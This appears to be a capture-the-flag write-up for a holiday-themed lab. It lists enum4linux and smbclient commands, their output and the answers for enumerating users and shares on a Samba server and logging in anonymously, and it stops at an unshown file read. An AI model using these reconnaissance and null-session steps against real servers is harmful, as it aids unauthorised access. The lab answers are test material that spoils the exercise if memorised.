
The Best Festival Company (TBFC) has since upscaled its IT infrastructure after last year's attack for all the other elves to use, including a VPN server and a few other services. You breathe a sigh of relief..."That's it, Me, Elf McEager saved the Christmas of 2020! I can't wait to---"
But suddenly, a cold shiver runs down your spine, interrupting your monologue...

You suddenly recall that Elf McSkidy had set up a Samba file server just before the attack occurred - could this have been hacked too?!  What about our data...Oh no, quick! Find out what usernames may have been leaked and attempt to login to the server yourself, noting down any vulnerabilities found to report back to Elf McSkidy.
- Using enum4linux, how many users are there on the Samba server ?
```
3
```
```
./enum4linux.pl 10.10.204.164 -U
user:[elfmcskidy] rid:[0x3e8]                                                           
user:[elfmceager] rid:[0x3ea]                                                           
user:[elfmcelferson] rid:[0x3e9]                                                        
```

- Now how many "shares" are there on the Samba server?
```
4
```
```
./enum4linux.pl 10.10.204.164 -S
 ==========================================                                             
|    Share Enumeration on 10.10.204.164    |                                            
 ==========================================                                             
WARNING: The "syslog" option is deprecated                                              
                                                                                        
        Sharename       Type      Comment                                               
        ---------       ----      -------                                               
        tbfc-hr         Disk      tbfc-hr                                               
        tbfc-it         Disk      tbfc-it                                               
        tbfc-santa      Disk      tbfc-santa                                            
        IPC$            IPC       IPC Service (tbfc-smb server (Samba, Ubuntu))   
```

- Use smbclient to try to login to the shares on the Samba server . What share doesn't require a password?
```
tbfc-santa
```
```
smbclient --no-pass -L //10.10.204.164/tbfc-santa/
```
- Log in to this share, what directory did ElfMcSkidy leave for Santa?
```
jingle-tunes 
```
```
smbclient -U '%' -N \\\\10.10.204.164\\tbfc-santa
WARNING: The "syslog" option is deprecated
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Nov 12 02:12:07 2020
  ..                                  D        0  Thu Nov 12 01:32:21 2020
  jingle-tunes                        D        0  Thu Nov 12 02:10:41 2020
  note_from_mcskidy.txt               N      143  Thu Nov 12 02:12:07 2020

                10252564 blocks of size 1024. 5199708 blocks available
smb: \> get note_from_mcskidy.txt 
getting file \note_from_mcskidy.txt of size 143 as note_from_mcskidy.txt (69.8 KiloBytes/sec) (average 69.8 KiloBytes/sec) 

cat note_from_mcskidy.txt 
